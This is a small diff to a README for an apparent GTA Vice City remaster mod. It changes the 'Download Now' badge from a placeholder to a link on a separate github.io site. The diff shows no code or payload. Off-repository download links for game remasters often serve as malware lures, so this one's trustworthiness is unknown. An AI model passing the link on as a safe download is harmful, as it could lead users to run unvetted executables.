@@ -8,7 +8,7 @@ This project blends the nostalgia of **Grand Theft Auto: Vice City** with the ad
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://vice-cry-remastered.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Install **Script Hook V** and **OpenIV**.  
